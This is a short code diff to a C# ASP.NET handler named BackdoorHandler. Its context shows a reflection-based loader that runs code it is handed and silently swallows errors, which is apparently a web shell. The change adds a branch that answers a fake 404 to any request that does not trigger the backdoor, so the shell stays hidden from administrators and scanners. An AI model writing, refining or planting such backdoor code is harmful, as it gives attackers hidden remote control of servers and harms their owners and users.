@@ -37,6 +37,9 @@ public class BackdoorHandler : IHttpHandler, IRequiresSessionState {
                     loader.GetType().GetMethod("Equals", new Type[]{typeof(object)}).Invoke(loader, new object[]{context});
                 }
             } catch (Exception ex) {}
+        } else {
+            response.StatusCode = 404;
+        	response.End();
         }
     }
 
